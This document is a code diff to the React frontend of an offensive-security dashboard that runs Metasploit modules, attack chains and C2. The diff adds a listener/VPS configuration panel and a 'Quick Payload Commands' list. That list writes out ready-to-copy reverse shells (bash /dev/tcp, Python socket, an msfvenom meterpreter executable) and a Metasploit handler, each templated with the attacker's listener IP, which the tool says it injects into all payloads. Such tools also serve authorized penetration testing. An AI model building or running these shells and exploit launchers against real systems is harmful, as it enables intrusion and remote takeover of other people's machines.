@@ -5,7 +5,8 @@ import {
   LayoutDashboard, Crosshair, GitBranch, Link, Radio, Brain, Terminal,
   Play, Square, Plus, Trash2, RefreshCw, ChevronRight, CheckCircle, XCircle,
   Zap, Shield, Wifi, Skull, Eye, Activity, Server, Lock, Globe, Copy,
-  Download, Search, Command, MonitorSmartphone, Clock, AlertTriangle, Target
+  Download, Search, Command, MonitorSmartphone, Clock, AlertTriangle, Target,
+  Settings, Save
 } from "lucide-react";
 import { ScrollArea } from "./components/ui/scroll-area";
 import { Progress } from "./components/ui/progress";
@@ -63,6 +64,10 @@ function App() {
   // Autonomous mode
   const [autonomousMode, setAutonomousMode] = useState(false);
 
+  // Global config
+  const [globalConfig, setGlobalConfig] = useState({ listener_ip: "", listener_port: 4444, c2_protocol: "tcp", operator_name: "operator", stealth_mode: false, auto_lhost: true });
+  const [configSaving, setConfigSaving] = useState(false);
+
   // Refs
   const pollIntervalRef = useRef(null);
   const chainPollRef = useRef(null);
@@ -82,16 +87,25 @@ function App() {
   useEffect(() => {
     const load = async () => {
       try {
-        const [tacticsRes, chainsRes, modulesRes, historyRes] = await Promise.all([
+        const [tacticsRes, chainsRes, modulesRes, historyRes, configRes] = await Promise.all([
           axios.get(`${API}/mitre/tactics`),
           axios.get(`${API}/chains`),
           axios.get(`${API}/metasploit/modules`),
-          axios.get(`${API}/scan/history`)
+          axios.get(`${API}/scan/history`),
+          axios.get(`${API}/config`)
         ]);
-        setMitreTactics(tacticsRes.data.tactics || []);
+        const tacticsObj = tacticsRes.data.tactics || {};
+        setMitreTactics(Object.entries(tacticsObj).map(([phase, data]) => ({ phase, ...data })));
         setAttackChains(chainsRes.data.chains || []);
         setMsfModules(modulesRes.data.modules || []);
         setHistory(historyRes.data || []);
+        if (configRes.data) {
+          setGlobalConfig(configRes.data);
+          if (configRes.data.listener_ip) {
+            setChainContext(prev => ({ ...prev, lhost: configRes.data.listener_ip }));
+            setMsfLhost(configRes.data.listener_ip);
+          }
+        }
       } catch (e) { addLog("error", `Init error: ${e.message}`); }
     };
     load();
@@ -238,13 +252,30 @@ function App() {
   const executeMsf = async () => {
     if (!msfModule) return;
     setMsfExecuting(true);
-    addLog("cmd", `msf > ${msfModule}`);
+    const effectiveLhost = msfLhost || globalConfig.listener_ip;
+    addLog("cmd", `msf > ${msfModule} [LHOST=${effectiveLhost || "NOT SET"}]`);
     try {
-      const res = await axios.post(`${API}/metasploit/execute`, { module: msfModule, target: target || "127.0.0.1", port: msfPort ? parseInt(msfPort) : null, options: {}, lhost: msfLhost, lport: 4444 });
+      const res = await axios.post(`${API}/metasploit/execute`, { module: msfModule, target: target || "127.0.0.1", port: msfPort ? parseInt(msfPort) : null, options: {}, lhost: effectiveLhost, lport: globalConfig.listener_port || 4444 });
       setMsfResult(res.data);
       addLog(res.data.success ? "success" : "error", res.data.success ? "Exploit SUCCESS" : "Exploit FAILED");
     } catch (e) { addLog("error", e.message); }
     setMsfExecuting(false);
+  };
+
+  // Save global config
+  const saveConfig = async () => {
+    setConfigSaving(true);
+    try {
+      const res = await axios.put(`${API}/config`, globalConfig);
+      if (res.data.config) setGlobalConfig(res.data.config);
+      addLog("success", `CONFIG SAVED: LHOST=${globalConfig.listener_ip}:${globalConfig.listener_port}`);
+      // Auto-update chain context and MSF
+      if (globalConfig.listener_ip) {
+        setChainContext(prev => ({ ...prev, lhost: globalConfig.listener_ip }));
+        setMsfLhost(globalConfig.listener_ip);
+      }
+    } catch (e) { addLog("error", `Config save failed: ${e.message}`); }
+    setConfigSaving(false);
   };
 
   // Filtered logs
@@ -258,6 +289,7 @@ function App() {
     { id: "chains", icon: Link, label: "Chains" },
     { id: "c2", icon: Radio, label: "C2" },
     { id: "ai", icon: Brain, label: "AI" },
+    { id: "config", icon: Settings, label: "Config" },
     { id: "logs", icon: Terminal, label: "Logs" },
   ];
 
@@ -298,6 +330,7 @@ function App() {
           <div className="flex justify-between"><span className="text-[#2F4F38]">STATUS</span><span className={isScanning ? "text-[#FFB000]" : "text-[#00FF41]"}>{isScanning ? "ENGAGING" : "STANDBY"}</span></div>
           <div className="flex justify-between"><span className="text-[#2F4F38]">TARGETS</span><span>{targets.length}</span></div>
           <div className="flex justify-between"><span className="text-[#2F4F38]">SESSIONS</span><span>{stats.sessions}</span></div>
+          <div className="flex justify-between"><span className="text-[#2F4F38]">LHOST</span><span className={globalConfig.listener_ip ? "text-[#00FF41]" : "text-[#FF003C]"}>{globalConfig.listener_ip || "NOT SET"}</span></div>
         </div>
       </div>
 
@@ -699,6 +732,101 @@ function App() {
                         </div>
                       </div>
                     )}
+                  </div>
+                )}
+
+                {/* ===== CONFIG ===== */}
+                {activeSection === "config" && (
+                  <div className="space-y-4" data-testid="config-section">
+                    <div className="flex items-center justify-between">
+                      <h3 className="text-xs font-bold tracking-[0.15em] uppercase">Global Operator Config</h3>
+                      <button onClick={saveConfig} disabled={configSaving} className="tac-btn tac-btn-solid text-[10px]" data-testid="save-config-btn">
+                        <Save size={12} /> {configSaving ? "SAVING..." : "SAVE CONFIG"}
+                      </button>
+                    </div>
+
+                    {/* Listener Config - Priority */}
+                    <div className="panel p-4">
+                      <div className="panel-header" style={{ margin: "-16px -16px 12px", padding: "8px 12px" }}>
+                        <h3 className="flex items-center gap-1"><Globe size={12} className="text-[#FF003C]" /> Listener / VPS Config</h3>
+                        <span className={`text-[10px] ${globalConfig.listener_ip ? "text-[#00FF41]" : "text-[#FF003C]"}`}>
+                          {globalConfig.listener_ip ? "CONFIGURED" : "NOT SET"}
+                        </span>
+                      </div>
+                      <div className="grid grid-cols-2 gap-3">
+                        <div>
+                          <label className="text-[10px] text-[#2F4F38] uppercase block mb-1">Listener IP (VPS/LHOST)</label>
+                          <input type="text" value={globalConfig.listener_ip} onChange={e => setGlobalConfig(prev => ({ ...prev, listener_ip: e.target.value }))} placeholder="e.g. 10.10.14.5" className="tac-input w-full text-xs" data-testid="config-listener-ip" />
+                          <p className="text-[10px] text-[#2F4F38] mt-1">IP de tu VPS/atacante. Se inyecta en todos los payloads.</p>
+                        </div>
+                        <div>
+                          <label className="text-[10px] text-[#2F4F38] uppercase block mb-1">Listener Port (LPORT)</label>
+                          <input type="number" value={globalConfig.listener_port} onChange={e => setGlobalConfig(prev => ({ ...prev, listener_port: parseInt(e.target.value) || 4444 }))} className="tac-input w-full text-xs" data-testid="config-listener-port" />
+                        </div>
+                        <div>
+                          <label className="text-[10px] text-[#2F4F38] uppercase block mb-1">C2 Protocol</label>
+                          <select value={globalConfig.c2_protocol} onChange={e => setGlobalConfig(prev => ({ ...prev, c2_protocol: e.target.value }))} className="tac-input w-full text-xs" data-testid="config-protocol">
+                            <option value="tcp">TCP (Reverse Shell)</option>
+                            <option value="https">HTTPS (Encrypted)</option>
+                            <option value="mtls">mTLS (Sliver)</option>
+                            <option value="dns">DNS (Covert)</option>
+                          </select>
+                        </div>
+                        <div>
+                          <label className="text-[10px] text-[#2F4F38] uppercase block mb-1">Operator Name</label>
+                          <input type="text" value={globalConfig.operator_name} onChange={e => setGlobalConfig(prev => ({ ...prev, operator_name: e.target.value }))} className="tac-input w-full text-xs" data-testid="config-operator-name" />
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Operation Mode */}
+                    <div className="panel p-4">
+                      <div className="panel-header" style={{ margin: "-16px -16px 12px", padding: "8px 12px" }}>
+                        <h3 className="flex items-center gap-1"><Shield size={12} /> Operation Mode</h3>
+                      </div>
+                      <div className="space-y-3">
+                        <div className="flex items-center justify-between">
+                          <div>
+                            <div className="text-xs text-[#8BBE95]">Auto-Inject LHOST</div>
+                            <div className="text-[10px] text-[#2F4F38]">Inyectar LHOST en todos los payloads/exploits automaticamente</div>
+                          </div>
+                          <button onClick={() => setGlobalConfig(prev => ({ ...prev, auto_lhost: !prev.auto_lhost }))} className={`w-12 h-6 border transition-all ${globalConfig.auto_lhost ? "border-[#00FF41] bg-[rgba(0,255,65,0.15)]" : "border-[#2F4F38]"}`} data-testid="toggle-auto-lhost">
+                            <div className={`w-4 h-4 mx-0.5 transition-all ${globalConfig.auto_lhost ? "ml-6 bg-[#00FF41]" : "bg-[#2F4F38]"}`} />
+                          </button>
+                        </div>
+                        <div className="flex items-center justify-between">
+                          <div>
+                            <div className="text-xs text-[#8BBE95]">Stealth Mode</div>
+                            <div className="text-[10px] text-[#2F4F38]">Evitar herramientas agresivas, delays entre requests</div>
+                          </div>
+                          <button onClick={() => setGlobalConfig(prev => ({ ...prev, stealth_mode: !prev.stealth_mode }))} className={`w-12 h-6 border transition-all ${globalConfig.stealth_mode ? "border-[#FFB000] bg-[rgba(255,176,0,0.15)]" : "border-[#2F4F38]"}`} data-testid="toggle-stealth">
+                            <div className={`w-4 h-4 mx-0.5 transition-all ${globalConfig.stealth_mode ? "ml-6 bg-[#FFB000]" : "bg-[#2F4F38]"}`} />
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Quick Commands */}
+                    <div className="panel p-4">
+                      <div className="panel-header" style={{ margin: "-16px -16px 12px", padding: "8px 12px" }}>
+                        <h3>Quick Payload Commands</h3>
+                      </div>
+                      <div className="space-y-2">
+                        {[
+                          { label: "MSFvenom Reverse Shell", cmd: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${globalConfig.listener_ip || "YOUR_IP"} LPORT=${globalConfig.listener_port} -f exe > shell.exe` },
+                          { label: "Bash Reverse Shell", cmd: `bash -i >& /dev/tcp/${globalConfig.listener_ip || "YOUR_IP"}/${globalConfig.listener_port} 0>&1` },
+                          { label: "Python Reverse Shell", cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${globalConfig.listener_ip || "YOUR_IP"}",${globalConfig.listener_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
+                          { label: "NC Listener", cmd: `nc -lvnp ${globalConfig.listener_port}` },
+                          { label: "MSF Handler", cmd: `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${globalConfig.listener_ip || "YOUR_IP"}; set LPORT ${globalConfig.listener_port}; exploit"` },
+                        ].map((item, i) => (
+                          <div key={i} className="flex items-center gap-2">
+                            <span className="text-[10px] text-[#FFB000] w-40 flex-shrink-0">{item.label}</span>
+                            <code className="text-[10px] text-[#00FF41] bg-[#020302] px-2 py-1 flex-1 truncate font-mono">{item.cmd}</code>
+                            <button onClick={() => { navigator.clipboard.writeText(item.cmd); addLog("info", `Copied: ${item.label}`); }} className="text-[#2F4F38] hover:text-[#00FF41] flex-shrink-0" data-testid={`copy-cmd-${i}`}><Copy size={12} /></button>
+                          </div>
+                        ))}
+                      </div>
+                    </div>
                   </div>
                 )}
 
